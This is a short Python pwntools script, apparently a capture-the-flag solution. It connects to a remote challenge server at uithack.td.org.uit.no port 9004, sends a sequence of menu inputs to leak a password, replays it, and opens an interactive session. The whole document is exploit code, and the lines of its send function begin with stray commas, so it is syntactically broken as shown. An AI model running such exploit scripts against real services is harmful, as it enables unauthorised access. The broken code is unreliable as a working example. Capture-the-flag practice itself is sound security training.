from pwn import *

# p = process("./escape")
p = remote("uithack.td.org.uit.no", 9004)

def send(payload):
, p.recvuntil(b">> ")
, p.sendline(payload)

send(b"1")
send(b"24")
send(b"AA")
send(b"2")
send(b"4")
send(b"3")
p.recvline()
password = p.recvline().strip()
print(len(password))
send(b"1")
send(b"40")
send(password)
send(b"5")

p.interactive()